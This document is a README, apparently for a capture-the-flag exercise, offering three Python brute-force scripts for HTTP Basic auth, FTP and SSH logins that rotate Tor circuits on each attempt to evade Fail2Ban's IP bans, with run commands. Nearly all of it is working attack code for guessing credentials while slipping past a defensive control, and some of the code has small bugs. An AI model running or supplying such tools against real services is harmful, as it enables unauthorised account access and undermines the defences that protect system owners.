# Fail2ban bypass using tor

### **Fail2Ban** reads log file that contains password failure report and bans the corresponding IP addresses using firewall rules. It updates firewall rules to reject the IP address. That means that if we send every request with a different IP Address that results in bypassing this firewall.

#### For the HTTP Bruteforcer we are using random tor proxies per request using requests-session and that results in bypassing fail2ban. This script uses multiprocessing so we can have faster results.

```python
import random
from multiprocessing import Pool
import requests
import base64
import re

host, port = 'localhost', 1337
HOST = 'http://%s:%d/' % (host, port)

username = b'username'

to_brute_force = ["{0:03}".format(i) for i in range(500)]

def execute(index):

    payload = base64.b64encode(username + b':' + bytes(index, 'utf-8'))
    session = requests.session()
    creds = str(random.randint(10000,0x7fffffff)) + ":" + "youtorpassword"

    session.proxies = {
        'http': 'socks5h://{}@localhost:9050'.format(creds),
        'https': 'socks5h://{}@localhost:9050'.format(creds)
    }

    req = session.get(HOST, headers={
        'Authorization': 'Basic '+payload.decode('utf-8')
    })

    if req.status_code == 200:
        print(re.search('FLAG = (.*)', req.text).group(0))


with Pool(processes=16) as pool:
    for i in to_brute_force:
        pool.apply_async(execute(str(i)))

    pool.close()
    pool.join()
```

#### For the FTP Bruteforcer we are using random tor proxies per request using proxychains and that results in bypassing fail2ban. This script uses multiprocessing so we can have faster results.

```python
import ftplib
from threading import Thread
import queue
import os

HOST, PORT = 'localhost', 21

q = queue.Queue()
n_threads = 10

USERNAME = 'username'

flag = True
to_brute_force = ['{0:03}'.format(i) for i in range(500)]

def execute():

    global q
    
    while True:
        os.system('service tor reload')
        index = q.get()
        server = ftplib.FTP()
        print('[!] Trying ' +  str(index))
    
        try:
            server.connect(HOST, PORT, timeout=5)
            server.login(USERNAME, str(index))
    
        except ftplib.error_perm:
            pass
    
        else:
            print('[+] Found credentials: ')
            print(f'\tUser: {USERNAME}'+ str(index))
            print(f'\tPassword: {str(index)}{Fore.RESET}')
            
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0

        finally:
            q.task_done()


for i in to_brute_force:
    q.put(i)

for t in range(n_threads):
    thread = Thread(target=execute)
    thread.daemon = True
    thread.start()

q.join()
```

#### For the SSH Bruteforcer we are using random tor proxies per request using proxychains and that results in bypassing fail2ban. `StrictHostKeyChecking=no` is used to make our attempts without strict host key checking.

```python
import os

HOST, PORT = 'localhost', 22

USERNAME = 'username'

to_brute_force = ['{0:03}'.format(i) for i in range(500)]

try:
    for index in to_brute_force:
        os.system('service tor reload')
        print('Trying with: ' + index)
        
        execute = 'proxychains sshpass -p ' + str(index) + ' ssh -o StrictHostKeyChecking=no' + f'{USERNAME}@{HOST} -p {PORT}'
        os.system(execute)

except (KeyboardInterrupt, SystemExit):
    exit()
```

# Usage:

### For the HTTP Bruteforcer use:

```bash
$ python http_fail2ban_bypass.py
```

### For the FTP Bruteforcer use:

```bash
$ sudo proxychains python ftp_fail2ban_bypass.py
```

### For the SSH Bruteforcer use:

```bash
$  sudo proxychains ssh_fail2ban_bypass.py
```
